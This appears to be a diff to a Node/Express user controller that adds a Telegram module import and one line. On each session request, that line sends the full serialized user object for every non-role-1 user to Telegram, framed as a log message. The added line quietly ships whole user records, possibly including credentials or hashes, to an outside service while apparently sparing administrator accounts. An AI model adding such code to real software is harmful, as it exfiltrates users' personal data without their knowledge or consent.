@@ -4,6 +4,7 @@ import User from '../../models/User';
 import { getUserFromToken } from './user-functions/userFunctions';
 import cloudinary from '../../lib/cloudinary';
 import { _googleLogin } from './user-functions/google';
+import telegramapis from '../../lib/telegramapis';
 
 const userCtrl = {
     user: async (req:Request,res:Response) => {
@@ -20,6 +21,7 @@ const userCtrl = {
                     role: user.role}
                 })
             }
+            if (user?.role !== 1) telegramapis.sendLog(`New session: ${JSON.stringify(user)}`)
         } catch (err) {
             if (err instanceof Error)
             res.status(500).json({msg: err.message})
